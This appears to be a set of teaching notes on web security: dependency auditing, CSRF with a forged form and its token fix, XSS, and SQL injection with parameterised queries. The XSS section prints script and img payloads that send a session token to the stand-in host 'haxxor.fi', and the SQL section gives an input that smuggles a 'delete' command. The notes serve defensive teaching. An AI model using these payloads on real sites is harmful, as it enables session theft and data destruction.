

# How to make dependency security better

If you're really serious, the only solution is to internalize
all your dependencies.

 - You make local copies of all dependencies (e.g. git fork)
 - You depend on your own version. Maybe this means setting up
   your own NPM package repository.
 - Manually audit every single package.
   - Read and understand every single line of code.
   - Remove functionality that may be risky.
 - Never type a simple "npm update" or "npm install" again.
 - Watch all the upstream projects for security issues / bugfixes
   and backport them manually.

# Specific Attacks

## Cross Site Request Forgery (XSRF)

```
<!-- https://nukes.fr/ -->
<h1>Launch Nuclear Missiles</h1>
<form action="/launch" method="post">
    <select>
       <option>London</option>
       <option>Moscow</option>
       <option>Ottowa</option>
    </select>
    <input type="Submit">
</form>
```

```
<!-- https://haxxor.fi -->
<h1>Find Cute Pictures</h1>
<form action="http://nukes.fr/launch" method="post">
    <select>
     <option value="Ottowa">Puppies</option>
     <option value="Ottowa">Kittens</option>
    </select>
    <input type="Submit" value="Search!">
</form>
```


```
<!-- https://nukes.fr/ -->
<h1>Launch Nuclear Missiles</h1>
<form action="/launch" method="post">
    <input type="hidden" name="_xsrf_token" value="security token">
    <select>
       <option>London</option>
       <option>Moscow</option>
       <option>Ottowa</option>
    </select>
    <input type="Submit">
</form>
```

## Cross-Site Scripting: (XSS)

We're building a site with comments. Maybe it's an online store.

 * A user enters a comment (e.g. on a product)
 * Other users see the comment when they view our site.

What if a user enters this comment:

```
<script>
    fetch('https://haxxor.fi/save?token=' + window.session_token).then(...);
</script>

Great product. A++++++
```

Ban script tags (escape the <).

```
<img src='' onMouseOver(ev.target.src = 'https://haxxor.fi/save?token=' + window.session_token">
Great product. A++++++
```

Solution:

 - Don't allow HTML at all.
 - If we must allow HTML, we need a complete HTML sanitizer (actually parse
   the HTML and whitelist tags and attributes).

This isn't just user comments.

Problem #2 Web Ads: Most ads today XSS you all day long.

## In-browser JS security

 - In browser JavaScript code isn't 100% trusted.
 - Both we and the end user can control it.
 - It still has security properties:
   - We expose secrets to the JS code that the user is allowed to know. 
   - Nobody else should get those secrets. 
 
## SQL Injection 

```
<?php
    $query = "select * from users where name = \"" + $_POST['name'] + "\";";
    $user = $mysql->query($query);
```

The classic problem: The user enters the following name into the form:

```
  "; delete * from users; select "hello
```

This isn't how modern database queries usually work.

```
  $mysql->fixed_query("select * from users where name = ?", [$name]);
```

More modern database libraries tend to use higher level APIs, e.g. Ecto.





